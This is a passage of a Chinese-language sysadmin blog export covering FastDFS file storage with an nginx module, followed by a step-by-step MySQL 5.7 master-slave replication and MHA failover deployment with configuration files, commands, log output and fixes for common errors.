/etc/fdfs/storage.confstorage首次启动会很慢，因为它在创建预设存储文件的目录，默认创建256个数据存放目录。检查服务是否启动正常# netstat -nultp | grep fdfstcp 0 0 0.0.0.0:22122 0.0.0.0:* LISTEN 14633/fdfs_trackerd tcp 0 0 0.0.0.0:23000 0.0.0.0:* LISTEN 14643/fdfs_storaged 使用自带的工具fdfs_test测试上传、删除文件12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273上传文件# fdfs_test /etc/fdfs/client.conf upload install.logThis is FastDFS client test program v5.05Copyright (C) 2008, Happy Fish / YuQingFastDFS may be copied only under the terms of the GNU GeneralPublic License V3, which may be found in the FastDFS source kit.Please visit the FastDFS Home Page http://www.csource.org/ for more detail.[2016-12-29 23:46:46] DEBUG - base_path=/home/fastdfs/client, connect_timeout=30, network_timeout=60, tracker_server_count=1, anti_steal_token=0, anti_steal_secret_key length=0, use_connection_pool=0, g_connection_pool_max_idle_time=3600s, use_storage_id=0, storage server id count: 0tracker_query_storage_store_list_without_group: server 1. group_name=, ip_addr=10.1.1.150, port=23000group_name=group1, ip_addr=10.1.1.150, port=23000storage_upload_by_filenamegroup_name=group1, remote_filename=M00/00/00/CgEBllhlL-aAJf9YAAAigwDiG9U128.logsource ip address: 10.1.1.150file timestamp=2016-12-29 23:46:46file size=8835file crc32=14818261example file url: http://10.1.1.150/group1/M00/00/00/CgEBllhlL-aAJf9YAAAigwDiG9U128.logstorage_upload_slave_by_filenamegroup_name=group1, remote_filename=M00/00/00/CgEBllhlL-aAJf9YAAAigwDiG9U128_big.logsource ip address: 10.1.1.150file timestamp=2016-12-29 23:46:46file size=8835file crc32=14818261example file url: http://10.1.1.150/group1/M00/00/00/CgEBllhlL-aAJf9YAAAigwDiG9U128_big.log上面这个example file url现在还不能在浏览器中直接访问，因为必须要配合nginx使用才行。我们看一下文件实际的物理存储位置。# ls /home/fastdfs/storage/data/00/00/ CgEBllhlL-aAJf9YAAAigwDiG9U128_big.log CgEBllhlL-aAJf9YAAAigwDiG9U128_big.log-m CgEBllhlL-aAJf9YAAAigwDiG9U128.log CgEBllhlL-aAJf9YAAAigwDiG9U128.log-m删除文件# fdfs_test /etc/fdfs/client.conf delete install.logThis is FastDFS client test program v5.05Copyright (C) 2008, Happy Fish / YuQingFastDFS may be copied only under the terms of the GNU GeneralPublic License V3, which may be found in the FastDFS source kit.Please visit the FastDFS Home Page http://www.csource.org/ for more detail.[2016-12-29 23:52:47] DEBUG - base_path=/home/fastdfs/client, connect_timeout=30, network_timeout=60, tracker_server_count=1, anti_steal_token=0, anti_steal_secret_key length=0, use_connection_pool=0, g_connection_pool_max_idle_time=3600s, use_storage_id=0, storage server id count: 0Usage: fdfs_test &lt;config_file&gt; delete &lt;group_name&gt; &lt;remote_filename&gt;删除的时候我们会发现报错了，因为删除文件必须要完整的group_name和remote_filename才可以。从上面的上传信息中我们可以得知group_name=group1,remote_filename=M00/00/00/CgEBllhlL-aAJf9YAAAigwDiG9U128_big.log，所以正确的删除命令应该是：# fdfs_test /etc/fdfs/client.conf delete group1 M00/00/00/CgEBllhlL-aAJf9YAAAigwDiG9U128.logThis is FastDFS client test program v5.05Copyright (C) 2008, Happy Fish / YuQingFastDFS may be copied only under the terms of the GNU GeneralPublic License V3, which may be found in the FastDFS source kit.Please visit the FastDFS Home Page http://www.csource.org/ for more detail.[2016-12-29 23:59:32] DEBUG - base_path=/home/fastdfs/client, connect_timeout=30, network_timeout=60, tracker_server_count=1, anti_steal_token=0, anti_steal_secret_key length=0, use_connection_pool=0, g_connection_pool_max_idle_time=3600s, use_storage_id=0, storage server id count: 0storage=10.1.1.150:23000delete file success删除成功。再来检查物理存储位置# ls /home/fastdfs/storage/data/00/00/ 目录下为空实际在上传时会在上传文件外另外生成一个文件名后加_big的文件，所以删除文件时应一并删除这两个文件。 2. 安装nginx和nginx-fastdfs模块并配置解压配置nginx-fastdfs123456789101112# tar zxf fastdfs-nginx-module_v1.16.tar.gz# cd fastdfs-nginx-module/编辑nginx模块的配置文件# vim src/config修改CORE_INCS=&quot;$CORE_INCS /usr/local/include/fastdfs /usr/local/include/fastcommon/&quot;修改为CORE_INCS=&quot;$CORE_INCS /usr/include/fastdfs /usr/include/fastcommon/&quot;因为实际上fastdfs的头文件在/usr/include/fastdfs与/usr/include/fastcommon/目录下复制配置文件# cp /root/soft/fastdfs/FastDFS/conf/http.conf /root/soft/fastdfs/FastDFS/conf/mime.types /etc/fdfs/ 安装nginx及nginx-fastdfs模块1234567解决依赖关系# yum install -y gcc* pcre-devel zlib-devel openssl-devel安装nginx# tar zxf openresty-1.11.2.1.tar.gz# cd openresty-1.11.2.1/# ./configure --with-http_gzip_static_module --add-module=/root/soft/fastdfs/fastdfs-nginx-module/src/# gmake &amp;&amp; gmake install 编辑nginx-fastdfs模块配置文件12345678910111213141516171819202122# cp /root/soft/fastdfs/fastdfs-nginx-module/src/mod_fastdfs.conf /etc/fdfs/# vim /etc/fdfs/mod_fastdfs.confconnect_timeout=2network_timeout=30base_path=/tmpload_fdfs_parameters_from_tracker=truestorage_sync_file_max_delay = 86400use_storage_id = falsestorage_ids_filename = storage_ids.conftracker_server=10.1.1.150:22122storage_server_port=23000group_name=group1url_have_group_name = truestore_path_count=1store_path0=/home/fastdfs/storagelog_level=infolog_filename=response_mode=proxyif_alias_prefix=flv_support = trueflv_extension = flvgroup_count = 0 编辑nginx配置文件12345678910111213141516171819202122232425262728# vim /usr/local/openresty/nginx/conf/nginx.confuser root;worker_processes 1;events &#123; worker_connections 1024;&#125;http &#123; include mime.types; default_type application/octet-stream; log_format main &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos; &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos; &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;; access_log logs/access.log main; sendfile on; keepalive_timeout 60; gzip on; server &#123; listen 80; server_name localhost; location ~/group([0-9])/M00 &#123; ngx_fastdfs_module; &#125; error_page 500 502 503 504 /50x.html; location = /50x.html &#123; root html; &#125; &#125;&#125; 启动nginx服务12# /usr/local/openresty/nginx/sbin/nginx -t# /usr/local/openresty/nginx/sbin/nginx 上传文件并测试是否能正常访问123# fdfs_test /etc/fdfs/client.conf upload test.html# curl -I http://10.1.1.150/group1/M00/00/00/CgEBlVhyVPSAM6m1AAAAhl47IRo71_big.htmlHTTP/1.1 200 OK 报错解决办法如果访问时报400错误，查看错误日志：1[2017-01-09 22:57:06] ERROR - file: ../common/fdfs_global.c, line: 52, the format of filename &quot;group1/M00/00/00/wKgBylhzpI2AW8AFAAAAE-vP9Cw582_big.txt&quot; is invalid 解决办法1234# vim /etc/fdfs/mod_fastdfs.conf将url_have_group_name = false修改为url_have_group_name = true","raw":null,"content":null,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://blog.unixmen.cn/categories/Linux/"},{"name":"FastDFS","slug":"Linux/FastDFS","permalink":"http://blog.unixmen.cn/categories/Linux/FastDFS/"}],"tags":[{"name":"FastDFS","slug":"FastDFS","permalink":"http://blog.unixmen.cn/tags/FastDFS/"}]},{"title":"MySQL+MHA安装部署","slug":"MySQL+MHA安装部署","date":"2017-01-14T16:00:00.000Z","updated":"2018-06-11T14:53:04.000Z","comments":true,"path":"2017/01/15/MySQL+MHA安装部署/","link":"","permalink":"http://blog.unixmen.cn/2017/01/15/MySQL+MHA安装部署/","excerpt":"1. 准备工作软件包版本\nmysql-5.7.17.tar.gzcmake-3.6.2.tar.gzmha4mysql-manager-0.57.tar.gzmha4mysql-node-0.57.tar.gz\n\n服务器明细\nkp-bt-101 Masterkp-bt-102   Candidate Masterkp-bt-103   Slavekp-bt-13    MHA-manager\n\n2. 安装MySQL服务解决依赖关系1# yum install -y gcc-c++ ncurses-devel openssh-clients","text":"1. 准备工作软件包版本 mysql-5.7.17.tar.gzcmake-3.6.2.tar.gzmha4mysql-manager-0.57.tar.gzmha4mysql-node-0.57.tar.gz 服务器明细 kp-bt-101 Masterkp-bt-102 Candidate Masterkp-bt-103 Slavekp-bt-13 MHA-manager 2. 安装MySQL服务解决依赖关系1# yum install -y gcc-c++ ncurses-devel openssh-clients 配置ssh互信123456在所有服务器均做如下配置# ssh-keygen -t rsa# ssh-copy-id -i /root/.ssh/id_rsa.pub &quot;-p 16811 root@kp-bt-101&quot;# ssh-copy-id -i /root/.ssh/id_rsa.pub &quot;-p 16812 root@kp-bt-102&quot;# ssh-copy-id -i /root/.ssh/id_rsa.pub &quot;-p 16813 root@kp-bt-103&quot;# ssh-copy-id -i /root/.ssh/id_rsa.pub &quot;-p 16813 root@kp-bt-13&quot; 安装cmake12345# tar zxf cmake-3.6.2.tar.gz# cd cmake-3.6.2/# ./bootstrap# gmake &amp;&amp; gmake install# cmake --version 准备Boost库支持1234# mkdir /usr/local/boost# wget -o /usr/local/boost/boost_1_59_0.tar.gz http://ncu.dl.sourceforge.net/project/boost/boost/1.59.0/boost_1_59_0.tar.gzboost1.63版本不支持MySQL5.7.17，编译时会报错。 创建Mysql安装目录以及数据库文件存放的路径12# mkdir -p /home/mysql# mkdir -p /home/mysql/data 创建mysql用户以及对应用户组12# groupadd mysql# useradd -r -g mysql mysql -s /sbin/nologin 编译安装MySQL1234# tar zxf mysql-5.7.17.tar.gz# # cd mysql-5.7.17/# cmake -DCMAKE_INSTALL_PREFIX=/home/mysql -DMYSQL_UNIX_ADDR=/home/mysql/mysql.sock -DDEFAULT_CHARSET=utf8 -DDEFAULT_COLLATION=utf8_general_ci -DWITH_MYISAM_STORAGE_ENGINE=1 -DWITH_INNOBASE_STORAGE_ENGINE=1 -DWITH_MEMORY_STORAGE_ENGINE=1 -DWITH_READLINE=1 -DENABLED_LOCAL_INFILE=1 -DMYSQL_DATADIR=/home/mysql/data -DMYSQL_USER=mysql -DMYSQL_TCP_PORT=3306 -DWITH_BOOST=/usr/local/boost# make &amp;&amp; make install 修改MySQL目录权限1# chown -R mysql.mysql /home/mysql/ 准备MySQL配置文件1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162# cp support-files/my-default.cnf /etc/my.cnfkp-bt-101 Master# vim /etc/my.cnf[mysqld]port = 3306basedir = /home/mysqldatadir = /home/mysql/datatmpdir = /home/mysql/tmplog-error = /home/mysql/log/mysql_run.errlog-bin = /home/mysql/data/mysql-binbinlog_format=mixedexpire_logs_days = 15skip-name-resolve#replication optionsserver-id = 1relay-log=rep_relay_logrelay-log-index=rep_relay_log_indexskip-slave-startkp-bt-102 Candidate Master# vim /etc/my.cnf[mysqld]port = 3306socket = /tmp/mysql.sockbasedir = /home/mysqldatadir = /home/mysql/datatmpdir = /home/mysql/tmplog-error = /home/mysql/log/mysql_run.errlog-bin = /home/mysql/data/mysql-binbinlog_format=mixedexpire_logs_days = 15skip-name-resolve#replication optionsserver-id = 2relay-log=rep_relay_logrelay-log-index=rep_relay_log_indexskip-slave-startkp-bt-103 Slave# vim /etc/my.cnf[mysqld]port = 3306socket = /tmp/mysql.sockbasedir = /home/mysqldatadir = /home/mysql/datatmpdir = /home/mysql/tmplog-error = /home/mysql/log/mysql_run.errlog-bin = /home/mysql/data/mysql-binbinlog_format=mixedexpire_logs_days = 15skip-name-resolve#replication optionsserver-id = 3relay-log=rep_relay_logrelay-log-index=rep_relay_log_indexskip-slave-start 初始化数据库、创建数据库系统表123# cd /home/mysql/# bin/mysqld --initialize --user=mysql --basedir=/home/mysql/ --datadir=/home/mysql/data/mysql初始化过程如果正常将不会出现任何提示，初始化过程中创建的默认密码输出到配置文件中指定的log_error文件中。 设置环境变量12# vim /etc/profile.d/mysql.shexport PATH=/home/mysql/bin:$PATH 为MySQL提供服务脚本，并将MySQL服务加入开机启动123# cp support-files/mysql.server /etc/init.d/mysql# chmod +x /etc/init.d/mysql# chkconfig mysql on 启动MySQL服务1# /etc/init.d/mysql start 修改MySQL初始root密码1# mysqladmin -uroot password &apos;password&apos; -p&apos;dh9&gt;qmyaBIZe&apos; 配置iptables规则123# iptables -I INPUT -p tcp --dport 3306 -s 192.168.1.0/24 -j ACCEPT# service iptables save所有MySQL节点都要配置iptables规则。 3. 配置主从复制创建数据库管理账号和复制账号及MHA监控账号12345所有服务器均执行mysql&gt; grant all privileges on *.* to &apos;root&apos;@&apos;192.168.1.%&apos; identified by &apos;nhE93d0qjPhkEcp3D&apos;;mysql&gt; grant replication slave,replication client,super on *.* to &apos;rep&apos;@&apos;192.168.1.%&apos; identified by &apos;2wsxzaq1&apos;;mysql&gt; grant all privileges on *.* to &apos;mha&apos;@&apos;192.168.1.%&apos; identified by &apos;4rfvxsw2&apos;;mysql&gt; flush privileges; 配置主从复制1234567891011Master查询Master状态mysql&gt; show master status;Candidate Mastermysql&gt; change master to master_host=&apos;192.168.1.101&apos;,master_port=3306,master_user=&apos;rep&apos;,master_password=&apos;2wsxzaq1&apos;,master_log_file=&apos;mysql-bin.000002&apos;,master_log_pos=1204;mysql&gt; start slave;Slavemysql&gt; change master to master_host=&apos;192.168.1.101&apos;,master_port=3306,master_user=&apos;rep&apos;,master_password=&apos;2wsxzaq1&apos;,master_log_file=&apos;mysql-bin.000002&apos;,master_log_pos=1204;mysql&gt; start slave ; 设置从库只读1mysql&gt; set global read_only=1; 检查主库、从库状态123456789Mastermysql&gt; show master status \\GSlavemysql&gt; show slave tatus\\G检查Slave_IO_Running、Slave_SQL_Running是否为Yes，如果Slave_IO_Running: YesSlave_SQL_Running: Yes则说明主从复制正常。 4. 安装配置MHA安装MHA-manager12345678910111213141516171819202122解决依赖关系# yum install perl-DBD-MySQL perl-Config-Tiny perl-Log-Dispatch perl-Parallel-ForkManager perl-Time-HiRes perl-ExtUtils-CBuilder perl-ExtUtils-MakeMaker -y# wget http://www.cpan.org/authors/id/A/AN/ANDK/CPAN-2.14.tar.gz# tar zxf CPAN-2.14.tar.gz # cd CPAN-2.14# perl Makefile.PL# make &amp;&amp; make install在mha-manager服务器上也需要安装mha-node# tar zxf mha4mysql-node-0.57.tar.gz# cd mha4mysql-node-0.57/# perl Makefile.PL# make &amp;&amp; make install安装mha-manager# tar zxf mha4mysql-manager-0.57.tar.gz# cd mha4mysql-manager-0.57/# perl Makefile.PL# make &amp;&amp; make install复制相关脚本到/usr/local/bin/# cp samples/scripts/* /usr/local/bin/ 安装MHA-node1234567891011121314在所有MySQL节点安装mha-node解决依赖关系# yum install perl-DBD-MySQL perl-Config-Tiny perl-Log-Dispatch perl-Parallel-ForkManager perl-Time-HiRes perl-ExtUtils-CBuilder perl-ExtUtils-MakeMaker -y# wget http://www.cpan.org/authors/id/A/AN/ANDK/CPAN-2.14.tar.gz# tar zxf CPAN-2.14.tar.gz # cd CPAN-2.14# perl Makefile.PL# make &amp;&amp; make install安装mha-node# tar zxf mha4mysql-node-0.57.tar.gz# cd mha4mysql-node-0.57/# perl Makefile.PL# make &amp;&amp; make install 配置MHA1234567891011121314151617181920212223242526272829303132333435363738394041创建MHA的工作目录，并且创建相关配置文件（在软件包解压后的目录里面有样例配置文件）# mkdir -p /etc/masterha# pwd/root/soft/mysql/mha4mysql-manager-0.57# cp samples/conf/app1.cnf /etc/masterha/# vim /etc/masterha/app1.cnf[server default]manager_workdir=/var/log/masterha/app1.log //设置manager的工作目录manager_log=/var/log/masterha/app1/manager.log //设置manager的日志master_binlog_dir=/home/mysql/data //设置master 保存binlog的位置，以便MHA可以找到master的日志，我这里的也就是mysql的数据目录master_ip_failover_script= /usr/local/bin/master_ip_failover //设置自动failover时候的切换脚本master_ip_online_change_script= /usr/local/bin/master_ip_online_change //设置手动切换时候的切换脚本user=mha 设置监控用户mhapassword=4rfvxsw2 //设置监控用户的密码ping_interval=3 //设置监控主库，发送ping包的时间间隔，默认是3秒，尝试三次没有回应的时候自动进行railoverremote_workdir=/tmp //设置远端mysql在发生切换时binlog的保存位置repl_user=rep //设置复制环境中的复制用户名repl_password=2wsxzaq1 //设置复制用户的密码report_script=/usr/local/bin/send_report //设置发生切换后发送的报警的脚本secondary_check_script= /usr/local/bin/masterha_secondary_check -s kp-bt-103 -s kp-bt-101 shutdown_script=&quot;&quot; //设置故障发生后关闭故障主机脚本（该脚本的主要作用是关闭主机放在发生脑裂,这里没有使用）ssh_user=root //设置ssh的登录用户名[server1]hostname=kp-bt-101ssh_port=16811port=3306candidate_master=1[server2]hostname=kp-bt-102ssh_port=16812port=3306candidate_master=1 //设置为候选master，如果设置该参数以后，发生主从切换以后将会将此从库提升为主库，即使这个主库不是集群中事件最新的slavecheck_repl_delay=0 //默认情况下如果一个slave落后master 100M的relay logs的话，MHA将不会选择该slave作为一个新的master，因为对于这个slave的恢复需要花费很长时间，通过设置check_repl_delay=0,MHA触发切换在选择一个新的master的时候将会忽略复制延时，这个参数对于设置了candidate_master=1的主机非常有用，因为这个候选主在切换的过程中一定是新的master[server3]hostname=kp-bt-103ssh_port=16813port=3306no_master=1 设置relay log的清除方式（在每个slave节点上）1234567891011121314mysql&gt; set global relay_log_purge=0;注意：MHA在发生切换的过程中，从库的恢复过程中依赖于relay log的相关信息，所以这里要将relay log的自动清除设置为OFF，采用手动清除relay log的方式。在默认情况下，从服务器上的中继日志会在SQL线程执行完毕后被自动删除。但是在MHA环境中，这些中继日志在恢复其他从服务器时可能会被用到，因此需要禁用中继日志的自动删除功能。定期清除中继日志需要考虑到复制延时的问题。在ext3的文件系统下，删除大的文件需要一定的时间，会导致严重的复制延时。为了避免复制延时，需要暂时为中继日志创建硬链接，因为在linux系统中通过硬链接删除大文件速度会很快。（在mysql数据库中，删除大表时，通常也采用建立硬链接的方式）MHA节点中包含了pure_relay_logs命令工具，它可以为中继日志创建硬链接，执行SET GLOBAL relay_log_purge=1,等待几秒钟以便SQL线程切换到新的中继日志，再执行SET GLOBAL relay_log_purge=0。pure_relay_logs脚本参数如下所示：--user mysql 用户名--password mysql 密码--port 端口号--workdir 指定创建relay log的硬链接的位置，默认是/var/tmp，由于系统不同分区创建硬链接文件会失败，故需要执行硬链接具体位置，成功执行脚本后，硬链接的中继日志文件被删除--disable_relay_log_purge 默认情况下，如果relay_log_purge=1，脚本会什么都不清理，自动退出，通过设定这个参数，当relay_log_purge=1的情况下会将relay_log_purge设置为0。清理relay log之后，最后将参数设置为OFF。 设置定期清理relay脚本(slave)123456789101112131415161718192021222324252627282930313233343536# vim purge_relay_log.sh#!/bin/bashuser=rootpasswd=nhE93d0qjPhkEcp3Dport=3306log_dir=&apos;/home/mha/log/&apos;work_dir=&apos;/home/mysql/data/&apos;purge=&apos;/usr/local/bin/purge_relay_logs&apos;if [ ! -d $log_dir ]then mkdir $log_dir -pfi$purge --user=$user --password=$passwd --disable_relay_log_purge --port=$port --workdir=$work_dir &gt;&gt; $log_dir/purge_relay_logs.log 2&gt;&amp;1# chmod +x purge_relay_log.sh将此脚本加入计划任务# crontab -l0 4 * * * /bin/bash /home/scripts/purge_relay_log.sh手动执行日志清除命令测试# /usr/local/bin/purge_relay_logs --user=root --password=nhE93d0qjPhkEcp3D --port=3306 -disable_relay_log_purge --workdir=/home/mysql/data/2017-01-12 04:05:58: purge_relay_logs script started. Found relay_log.info: /home/mysql/data/relay-log.info Opening /home/mysql/data/rep_relay_log.000001 .. Opening /home/mysql/data/rep_relay_log.000002 .. Executing SET GLOBAL relay_log_purge=1; FLUSH LOGS; sleeping a few seconds so that SQL thread can delete older relay log files (if it keeps up); SET GLOBAL relay_log_purge=0; .. ok.2017-01-12 04:06:01: All relay log purging operations succeeded.如果出现错误提示：2017-01-12 03:47:16: purge_relay_logs script started.DBI connect(&apos;;host=127.0.0.1;port=3306&apos;,&apos;root&apos;,...) failed: Host &apos;127.0.0.1&apos; is not allowed to connect to this MySQL server at /usr/local/bin/purge_relay_logs line 185则是因为，在MySQL5.7中，默认没有创建root@127.0.0.1用户，此时我们需要手动创建用户mysql&gt; grant all privileges on *.* to &apos;root&apos;@&apos;127.0.0.1&apos; identified by &apos;nhE93d0qjPhkEcp3D&apos;; 在MHA-master上检查ssh配置1234567891011121314151617181920212223检查MHA Manger到所有MHA Node的SSH连接状态：# masterha_check_ssh --conf=/etc/masterha/app1.cnf Thu Jan 12 04:09:23 2017 - [warning] Global configuration file /etc/masterha_default.cnf not found. Skipping.Thu Jan 12 04:09:23 2017 - [info] Reading application default configuration from /etc/masterha/app1.cnf..Thu Jan 12 04:09:23 2017 - [info] Reading server configuration from /etc/masterha/app1.cnf..Thu Jan 12 04:09:23 2017 - [info] Starting SSH connection tests..Thu Jan 12 04:09:23 2017 - [debug] Thu Jan 12 04:09:23 2017 - [debug] Connecting via SSH from root@kp-bt-101(192.168.1.101:16811) to root@kp-bt-102(192.168.1.102:16812)..Thu Jan 12 04:09:23 2017 - [debug] ok.Thu Jan 12 04:09:23 2017 - [debug] Connecting via SSH from root@kp-bt-101(192.168.1.101:16811) to root@kp-bt-103(192.168.1.103:16813)..Thu Jan 12 04:09:23 2017 - [debug] ok.Thu Jan 12 04:09:24 2017 - [debug] Thu Jan 12 04:09:23 2017 - [debug] Connecting via SSH from root@kp-bt-102(192.168.1.102:16812) to root@kp-bt-101(192.168.1.101:16811)..Thu Jan 12 04:09:24 2017 - [debug] ok.Thu Jan 12 04:09:24 2017 - [debug] Connecting via SSH from root@kp-bt-102(192.168.1.102:16812) to root@kp-bt-103(192.168.1.103:16813)..Thu Jan 12 04:09:24 2017 - [debug] ok.Thu Jan 12 04:09:24 2017 - [debug] Thu Jan 12 04:09:24 2017 - [debug] Connecting via SSH from root@kp-bt-103(192.168.1.103:16813) to root@kp-bt-101(192.168.1.101:16811)..Thu Jan 12 04:09:24 2017 - [debug] ok.Thu Jan 12 04:09:24 2017 - [debug] Connecting via SSH from root@kp-bt-103(192.168.1.103:16813) to root@kp-bt-102(192.168.1.102:16812)..Thu Jan 12 04:09:24 2017 - [debug] ok.Thu Jan 12 04:09:24 2017 - [info] All SSH connection tests passed successfully.所有节点正常。 使用MHA-manager检查复制集群状态123456789101112131415161718192021222324252627282930313233# masterha_check_ssh --conf=/etc/masterha/app1.cnf Thu Jan 12 04:09:23 2017 - [warning] Global configuration file /etc/masterha_default.cnf not found. Skipping.Thu Jan 12 04:09:23 2017 - [info] Reading application default configuration from /etc/masterha/app1.cnf..Thu Jan 12 04:09:23 2017 - [info] Reading server configuration from /etc/masterha/app1.cnf..Thu Jan 12 04:09:23 2017 - [info] Starting SSH connection tests..Thu Jan 12 04:09:23 2017 - [debug] Thu Jan 12 04:09:23 2017 - [debug] Connecting via SSH from root@kp-bt-101(192.168.1.101:16811) to root@kp-bt-102(192.168.1.102:16812)..Thu Jan 12 04:09:23 2017 - [debug] ok.Thu Jan 12 04:09:23 2017 - [debug] Connecting via SSH from root@kp-bt-101(192.168.1.101:16811) to root@kp-bt-103(192.168.1.103:16813)..Thu Jan 12 04:09:23 2017 - [debug] ok.Thu Jan 12 04:09:24 2017 - [debug] Thu Jan 12 04:09:23 2017 - [debug] Connecting via SSH from root@kp-bt-102(192.168.1.102:16812) to root@kp-bt-101(192.168.1.101:16811)..Thu Jan 12 04:09:24 2017 - [debug] ok.Thu Jan 12 04:09:24 2017 - [debug] Connecting via SSH from root@kp-bt-102(192.168.1.102:16812) to root@kp-bt-103(192.168.1.103:16813)..Thu Jan 12 04:09:24 2017 - [debug] ok.Thu Jan 12 04:09:24 2017 - [debug] Thu Jan 12 04:09:24 2017 - [debug] Connecting via SSH from root@kp-bt-103(192.168.1.103:16813) to root@kp-bt-101(192.168.1.101:16811)..Thu Jan 12 04:09:24 2017 - [debug] ok.Thu Jan 12 04:09:24 2017 - [debug] Connecting via SSH from root@kp-bt-103(192.168.1.103:16813) to root@kp-bt-102(192.168.1.102:16812)..Thu Jan 12 04:09:24 2017 - [debug] ok.Thu Jan 12 04:09:24 2017 - [info] All SSH connection tests passed successfully.[root@kp-bt-13 bin]# masterha_check_repl --conf=/etc/masterha/app1.cnfThu Jan 12 04:10:17 2017 - [warning] Global configuration file /etc/masterha_default.cnf not found. Skipping.Thu Jan 12 04:10:17 2017 - [info] Reading application default configuration from /etc/masterha/app1.cnf..Thu Jan 12 04:10:17 2017 - [info] Reading server configuration from /etc/masterha/app1.cnf..Thu Jan 12 04:10:17 2017 - [info] MHA::MasterMonitor version 0.57.Creating directory /var/log/masterha/app1.log.. done.Thu Jan 12 04:10:17 2017 - [error][/usr/local/share/perl5/MHA/ServerManager.pm, ln193] There is no alive slave. We can&apos;t do failoverThu Jan 12 04:10:17 2017 - [error][/usr/local/share/perl5/MHA/MasterMonitor.pm, ln427] Error happened on checking configurations. at /usr/local/share/perl5/MHA/MasterMonitor.pm line 329Thu Jan 12 04:10:17 2017 - [error][/usr/local/share/perl5/MHA/MasterMonitor.pm, ln525] Error happened on monitoring servers.Thu Jan 12 04:10:17 2017 - [info] Got exit code 1 (Not master dead).MySQL Replication Health is NOT OK! 检查复制状态is NOT OK的集中常见错误及解决办法12345678910111213141516171819202122报错提示：[error][/usr/local/share/perl5/MHA/MasterMonitor.pm, ln427] Error happened on checking configurations. at /usr/local/share/perl5/MHA/MasterMonitor.pm line 329解决办法：在所有节点设置# ln -s /home/mysql/bin/mysqlbinlog /usr/local/bin/mysqlbinlog# ln -s /home/mysql/bin/mysql /usr/local/bin/mysql报错提示：mysqlbinlog: [ERROR] unknown variable &apos;default-character-set=utf8&apos;mysqlbinlog version command failed with rc 7:0, please verify PATH, LD_LIBRARY_PATH, and client options at /usr/local/bin/apply_diff_relay_logs line 493产生这个问题的原因是因为我在my.cnf中的client选项组中添加了default-character-set=utf8解决办法：在所有MySQL节点上的my.cnf文件client配置段注释掉default-character-set =utf8# default-character-set =utf8无需重启MySQL服务，因为使用mysqlbinlog工具查看二进制日志时会重新读取的mysql的配置文件my.cnf，而不是服务器已经加载进内存的配置文件。报错提示：Execution of /usr/local/bin/master_ip_failover aborted due to compilation errors.Thu Jan 12 13:26:30 2017 - [error][/usr/local/share/perl5/MHA/MasterMonitor.pm, ln229] Failed to get master_ip_failover_script status with return code 255:0.这是因为我们还没有配置master_ip_failover文件，先在配置文件中注释掉master_ip_failover_script= /usr/local/bin/master_ip_failover就可以了。# master_ip_failover_script= /usr/local/bin/master_ip_failover 再次运行masterha_check_repl脚本检查集群复制状态123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475# masterha_check_repl --conf=/etc/masterha/app1.cnfThu Jan 12 14:29:38 2017 - [warning] Global configuration file /etc/masterha_default.cnf not found. Skipping.Thu Jan 12 14:29:38 2017 - [info] Reading application default configuration from /etc/masterha/app1.cnf..Thu Jan 12 14:29:38 2017 - [info] Reading server configuration from /etc/masterha/app1.cnf..Thu Jan 12 14:29:38 2017 - [info] MHA::MasterMonitor version 0.57.Thu Jan 12 14:29:38 2017 - [info] GTID failover mode = 0Thu Jan 12 14:29:38 2017 - [info] Dead Servers:Thu Jan 12 14:29:38 2017 - [info] Alive Servers:Thu Jan 12 14:29:38 2017 - [info] kp-bt-101(192.168.1.101:3306)Thu Jan 12 14:29:38 2017 - [info] kp-bt-102(192.168.1.102:3306)Thu Jan 12 14:29:38 2017 - [info] kp-bt-103(192.168.1.103:3306)Thu Jan 12 14:29:38 2017 - [info] Alive Slaves:Thu Jan 12 14:29:38 2017 - [info] kp-bt-102(192.168.1.102:3306) Version=5.7.17-log (oldest major version between slaves) log-bin:enabledThu Jan 12 14:29:38 2017 - [info] Replicating from 192.168.1.101(192.168.1.101:3306)Thu Jan 12 14:29:38 2017 - [info] Primary candidate for the new Master (candidate_master is set)Thu Jan 12 14:29:38 2017 - [info] kp-bt-103(192.168.1.103:3306) Version=5.7.17-log (oldest major version between slaves) log-bin:enabledThu Jan 12 14:29:38 2017 - [info] Replicating from 192.168.1.101(192.168.1.101:3306)Thu Jan 12 14:29:38 2017 - [info] Not candidate for the new Master (no_master is set)Thu Jan 12 14:29:38 2017 - [info] Current Alive Master: kp-bt-101(192.168.1.101:3306)Thu Jan 12 14:29:38 2017 - [info] Checking slave configurations..Thu Jan 12 14:29:38 2017 - [info] Checking replication filtering settings..Thu Jan 12 14:29:38 2017 - [info] binlog_do_db= , binlog_ignore_db= Thu Jan 12 14:29:38 2017 - [info] Replication filtering check ok.Thu Jan 12 14:29:38 2017 - [info] GTID (with auto-pos) is not supportedThu Jan 12 14:29:38 2017 - [info] Starting SSH connection tests..Thu Jan 12 14:29:40 2017 - [info] All SSH connection tests passed successfully.Thu Jan 12 14:29:40 2017 - [info] Checking MHA Node version..Thu Jan 12 14:29:40 2017 - [info] Version check ok.Thu Jan 12 14:29:40 2017 - [info] Checking SSH publickey authentication settings on the current master..Thu Jan 12 14:29:40 2017 - [info] HealthCheck: SSH to kp-bt-101 is reachable.Thu Jan 12 14:29:40 2017 - [info] Master MHA Node version is 0.57.Thu Jan 12 14:29:40 2017 - [info] Checking recovery script configurations on kp-bt-101(192.168.1.101:3306)..Thu Jan 12 14:29:40 2017 - [info] Executing command: save_binary_logs --command=test --start_pos=4 --binlog_dir=/home/mysql/data --output_file=/tmp/save_binary_logs_test --manager_version=0.57 --start_file=mysql-bin.000002 Thu Jan 12 14:29:40 2017 - [info] Connecting to root@192.168.1.101(kp-bt-101:16811).. Creating /tmp if not exists.. ok. Checking output directory is accessible or not.. ok. Binlog found at /home/mysql/data, up to mysql-bin.000002Thu Jan 12 14:29:41 2017 - [info] Binlog setting check done.Thu Jan 12 14:29:41 2017 - [info] Checking SSH publickey authentication and checking recovery script configurations on all alive slave servers..Thu Jan 12 14:29:41 2017 - [info] Executing command : apply_diff_relay_logs --command=test --slave_user=&apos;mha&apos; --slave_host=kp-bt-102 --slave_ip=192.168.1.102 --slave_port=3306 --workdir=/tmp --target_version=5.7.17-log --manager_version=0.57 